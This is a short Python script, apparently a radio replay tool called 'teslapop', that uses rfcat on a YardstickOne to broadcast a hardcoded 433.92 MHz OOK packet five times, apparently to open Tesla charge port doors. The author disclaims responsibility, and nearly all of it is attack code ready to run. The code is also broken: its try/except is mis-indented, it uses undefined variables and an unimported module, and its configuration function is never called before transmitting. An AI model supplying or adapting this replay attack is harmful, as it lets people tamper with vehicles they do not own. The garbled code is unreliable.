#!/usr/bin/env python

import sys
from rflib import *
from struct import *
import argparse
import bitstring

#teslapop.py is written by PickedItMate
#using rfcat on the YardstickOne by GSG
#This script may be updated from time to time,
#for updates or to report bugs.
#I ( PickedItMate) accept no responsibility for your use of this script.

#transmits 5 times the binary sequence 00010101010101010101010101010001010110010100110010110101010101010101001011010101010010110100101011010011010011001010101101001011000101011001010011001011001100110011001100101101010101001011010001010110100110100110010101011010010010001010110011000110010110011001100110011001011010011010010110110010101101001101010000101010110100101000
#converted to hexadecimal and zero padded at the end for a full packet 15555551594CB55552D54B4AD34CAB4B1594CB33332D54B4569A655A48ACC659999969A5B2B4D42AD280


d = RfCat()

def ConfigureD(d):
    d.setModeIDLE()
    d.setMdmModulation(MOD_ASK_OOK)
    d.setFreq(433920000)
    d.setMdmDRate(2500)
	#d.setBaudRate(2500)
	#d.setMaxPower()
    d.setAmpMode(1)
	

try:
    #d.makePktFLEN(len(42))
    d.RFxmit((b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80'*5))
    except Exception as e:
        print ("Lost communication to USB device.. waiting 3 seconds, then retrying.")
        time.sleep(3)
        ConfigureD(d)

        if(results.repeatTimes == 1):
            if(startn >= adder):
                startn = startn - adder
				endy = endy - adder
        elif(results.repeatTimes >= 2):
            if(startn >= 1):
                startn = startn - 1
                endy = endy - 1

print ("")
print ("Done.")
d.setModeIDLE()




